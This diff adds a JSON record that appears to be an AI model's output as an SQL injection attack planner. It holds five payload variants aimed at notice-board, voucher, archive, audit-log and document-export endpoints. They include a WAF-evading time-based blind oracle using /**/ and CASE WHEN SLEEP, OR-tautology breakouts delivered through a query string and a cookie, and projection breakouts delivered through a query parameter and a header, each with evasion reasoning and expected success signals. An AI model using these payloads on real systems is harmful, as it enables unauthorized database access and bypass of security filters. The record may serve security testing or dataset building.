@@ -1,0 +1,68 @@
+{
+ "key": "sqli_4",
+ "model": "opencode/glm-5.3-flash-free",
+ "class": "sqli",
+ "variants": [
+  {
+   "endpoint": "POST /intranet/getNoticeBoard",
+   "target_param": "res_id (form body)",
+   "recon_evidence": "res_id is a numeric key interpolated into WHERE res_id = ... and requests whose body parameters contain a space are rejected by the edge WAF with a generic 403 while DB errors are suppressed, leaving response timing as the only distinguishable channel.",
+   "planner_rationale": "Space-filtering WAF on a numeric body parameter - substitute /**/ for spaces and gate a SLEEP behind CASE WHEN for a blind boolean-time oracle.",
+   "vuln_class": "sqli",
+   "payload": "res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0",
+   "injection_point": "body",
+   "expected_success_signal": "The notice-board response returns after roughly 6 seconds exactly when LENGTH(version())=10 holds, while control probes such as =6 or =15 return instantly, giving a repeatable conditional-timing oracle.",
+   "confidence": 0.9,
+   "reasoning": "/**/ restores token separation without the filtered space, and wrapping SLEEP(6*1) in CASE WHEN makes the delay data-dependent, so a space-stripping WAF plus silent error handling still leaves a solvable blind oracle; the leading numeric 51- keeps the parameter syntactically numeric."
+  },
+  {
+   "endpoint": "GET /shop/voucher/validate?voucher=SAVE20",
+   "target_param": "voucher (query string)",
+   "recon_evidence": "Appending a quote to voucher surfaces a stack trace reading WHERE (voucher='...') AND cart_active=1, and a valid code renders exactly one discount row, so the predicate sits inside a parenthesized quoted context.",
+   "planner_rationale": "Parenthesized quoted context - mirror the wrapper's own ')' and quote, then widen the result with an OR tautology.",
+   "vuln_class": "sqli",
+   "payload": "') OR ('1'='1",
+   "injection_point": "query",
+   "expected_success_signal": "Validation succeeds for arbitrary voucher strings and the response renders all active discount rows instead of the single row matching one code.",
+   "confidence": 0.9,
+   "reasoning": "The leading ') closes both the string literal and the wrapper's parenthesis, and the trailing ('1'='1 re-opens and re-closes a quote so the statement stays balanced; the always-true OR drops the voucher filter, and the widened row set is directly observable."
+  },
+  {
+   "endpoint": "GET /archive/documents?cols=name",
+   "target_param": "cols (query string)",
+   "recon_evidence": "The handler builds SELECT {cols} FROM filelist verbatim against a SQLite store, and a stray quote appended to cols returns a 500 page echoing an SQLite compile error that reproduces the attacker text inside the SELECT.",
+   "planner_rationale": "Projection interpolated into the SELECT column list - close it with a quote and re-open the query body with FROM/ORDER BY; the echoed compile error proves control.",
+   "vuln_class": "sqli",
+   "payload": "' FROM filelist ORDER BY filename collate nocase asc",
+   "injection_point": "query",
+   "expected_success_signal": "SQLite 'unrecognized token' compile error echoing the injected fragment inside the compiled SELECT statement.",
+   "confidence": 0.85,
+   "reasoning": "The opening quote terminates the column-list position and the appended FROM filelist ORDER BY ... tokens are compiled raw, while the collate nocase clause matches the confirmed SQLite dialect; the echoed compile error simultaneously proves injection and serves as a debugging channel."
+  },
+  {
+   "endpoint": "GET /admin/audit/log",
+   "target_param": "branch (Cookie header)",
+   "recon_evidence": "Row scoping is driven by a branch cookie; a malformed value triggers a debug response exposing WHERE (branch='EAST') AND owner_id=17, and editing the cookie visibly changes which audit rows are returned.",
+   "planner_rationale": "Cookie-driven parenthesized quoted scoping - keep the wrapper balanced and widen the scope with an OR tautology.",
+   "vuln_class": "sqli",
+   "payload": "') OR ('1'='1",
+   "injection_point": "cookie",
+   "expected_success_signal": "The audit listing returns entries for every branch rather than only the one encoded in the cookie, with no error or validation failure.",
+   "confidence": 0.8,
+   "reasoning": "The cookie value lands verbatim inside the parenthesized quoted predicate shown in the debug trace, so ') OR ('1'='1 mirrors the wrapper's parentheses and makes the branch filter always true, expanding the visible row scope; some frameworks re-encode cookie punctuation, which is the residual risk."
+  },
+  {
+   "endpoint": "GET /api/vault/documents/export",
+   "target_param": "X-Fields (request header)",
+   "recon_evidence": "Altering X-Fields visibly changes the export columns, and a stray quote in the header yields an SQLite syntax-error 500 echoing the header value inside the rendered SELECT column list, indicating raw interpolation before execution.",
+   "planner_rationale": "Same projection breakout delivered through a client-controlled header that the export builder pastes into the SELECT column list.",
+   "vuln_class": "sqli",
+   "payload": "' FROM filelist ORDER BY filename collate nocase asc",
+   "injection_point": "header",
+   "expected_success_signal": "SQLite 'unrecognized token' compile error echoing the header-supplied fragment within the compiled SELECT, confirming the header reaches the statement unfiltered.",
+   "confidence": 0.7,
+   "reasoning": "The quote closes the interpolated column list and the FROM/ORDER BY sequence is compiled as live SQL, inherited from the same projection-interpolation mechanism observed via the echoed error; the header path is less commonly exercised, so confidence is deliberately lower pending direct delay/error confirmation."
+  }
+ ],
+ "raw_tail": "d.\",\n    \"confidence\": 0.7,\n    \"reasoning\": \"The quote closes the interpolated column list and the FROM/ORDER BY sequence is compiled as live SQL, inherited from the same projection-interpolation mechanism observed via the echoed error; the header path is less commonly exercised, so confidence is deliberately lower pending direct delay/error confirmation.\"\n  }\n]\n\u001b[0m\n> build · glm-5.3-flash-free\n"
+}
